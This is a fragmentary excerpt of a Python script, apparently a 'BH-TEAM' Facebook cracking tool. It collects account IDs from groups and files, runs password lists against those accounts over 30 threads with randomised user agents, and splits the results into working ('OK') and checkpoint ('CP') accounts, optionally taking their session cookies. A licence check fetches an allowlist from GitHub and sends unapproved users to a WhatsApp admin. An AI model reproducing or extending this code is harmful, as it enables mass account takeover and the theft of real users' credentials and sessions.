...
def login_lagi334():
	try:
		...
		cookie=input(f'[➣_] INPUT COOKIE :{asu} ')
		...
		print(f'{asu}LOGINED SUCEES RUN AGIN ');time.sleep(1)
		os.system('python run.py')
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'{asu} COOKIE CHECK POINT'%(x,k,x,m,x))
		os.system('python run.py')
def bot():
	try:
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. BH-TEAM {h}OK{x} Anda ')
	print(f'>> 2. BH-TEAM {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('[ + ] HOW MANY IDS FOR CRACK [ MAX 20 ] : '))
	except ValueError:
...
def grup():
	...
	if berr2=='Masuk Facebook':
		...
		Uzzal_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
...
def crack_file():
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/BH-TEAM/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'[➣_%s]. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('[➣_] %s. %s ({h} %s {x}id) '%(cih,isi,len(hem)))
		geeh = input('\nCHOICE : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' CHOICE NUMER')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/BH-TEAM/'+geh,'r').read().splitlines()
		except:
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'[ 1 ] CRACK OLD FB')
	print('[ 2 ] CRACK NEW FB')
	print('[ 3 ] CRACK RANDOM FB')
	hu = input('\n[ ! ] CHOOISE : ')
	if hu in ['1','01']:
...
#	elif hc in ['4','04']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('[ + ] SHOW APPS (Y/T) :  ')
	if _jembot_ in ['']:
		print(' CHOICE Y and T ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('[ + ] AUTO PASSWORD  (Y/T) :  ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel(' 1122334455,5544332211,..... '))
		pwku=input('[➣_] INPUT PASS : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	...
	print(f'\033[92;1mFOOL CLONING HAVE START PLS WAIT...\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] CRACK HAS COMPILETED [cyan] ✓[white] '))
	print(f'{h}[➣_] TOTALL OK : {h}%s '%(ok))
	print(f'{x}[➣_] TOTALL CP : {k}%s{x} '%(cp))
	print('')
	print(' YOR REDY YOUR CRACK : (Y/T)')
	woi = input('[➣_] CHOICE: ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[➣_] GOOD BYE  ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
os.system('clear');banner()
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ BH-TEAM ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ BH-TEAM ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='BH-TEAM CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='BH-TEAM OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
...
def xoshnaw():
  ...
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/UZZAL/VAU/main/Ac.txt").text
    if id in httpCaht:
      print("\033[1;92YOUR STATUS ID: ACTIVE \x1b[38;5;46m[✔]       ")
      msg = str(os.geteuid())
      time.sleep(2)
      pass
    else:
      ...
      os.system('xdg-open https://wa.me/+8801843438888?text=ADMIN+PLEASE+APPROVE+MY+ID+LICENSI+NUMBER')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
